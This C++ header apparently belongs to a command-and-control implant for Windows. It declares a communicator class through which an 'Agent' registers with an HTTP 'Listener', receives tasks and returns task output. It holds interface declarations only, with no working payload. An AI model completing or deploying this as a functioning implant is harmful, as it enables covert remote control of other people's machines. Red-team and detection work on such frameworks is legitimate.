#pragma once
#include <Windows.h>
#include "utils/winapi.h"
#include "utils/queue.h"

/* Struct to store */
struct BaseCommunicatorThreadArgs
{
    PCHAR listenerHost;
    DWORD listenerPort;
    WinApiCustom *pWinApiCustom;
    PCHAR agentId;
    Queue *pTaskInputQueue;
    Queue *pTaskOutputQueue;
};

/*
HTTP Communicator; connects to HTTP Listener
*/
class BaseCommunicator
{
protected:
    PCHAR listenerHost;
    DWORD listenerPort;
    WinApiCustom *pWinApiCustom;
    LPVOID pCommunicateWithListenerData;   // Stores data to send to Listener in the next communication
    DWORD communicateWithListenerDataSize; // Stores size of data to send to Listener in the next communication
    PCHAR agentId;
    Queue *pTaskInputQueue;
    Queue *pTaskOutputQueue;

    /* Starts and maintains communication with Listener; invoked internally by StartCommunicatorThread() */
    virtual void StartCommunication();

public:
    /* Constructor; for initialisation */
    BaseCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR agentId, Queue *pTaskInputQueue, Queue *pTaskOutputQueue);

    /* Destructor; for cleanup */
    virtual ~BaseCommunicator();

    /* Queue data to register Agent with Listener */
    void QueueRegistrationDataAsFirstAgentOutput();

    /* Verify if Agent registration was successful */
    BOOL IsAgentRegistrationSuccessful();

    /*
    Prepare data to send to Listener; this should be used before CommunicateWithListener()

    This function does:
    1. Frees and resets previous `pCommunicateWithListenerData` and `communicateWithListenerDataSize`
    2. Sets up `pCommunicateWithListenerData` and `communicateWithListenerDataSize` with TaskOutputQueue data, and is ready to be sent to Listener by CommunicateOnceWithListener()
    3. Clears TaskOutputQueue
    */
    void PrepareDataForCommunicateOnceWithListener(BOOL forRegistration);

    /*
    Processes response from Listener; this should be used after CommunicateWithListener()
    
    This function does:
    1. Processes pResponseData to append to TaskInputQueue, by creating space (heap) for each Task and copying it to the space
    
    This function does not:
    1. Free up `pResponseData`; need to do it explicitly
    */
    void ProcessResponseFromCommunicateOnceWithListener(LPVOID pResponseData, DWORD responseDataSize);

    /* Sends/receive data to/from Listener once */
    virtual void CommunicateOnceWithListener(BOOL forRegistration);
};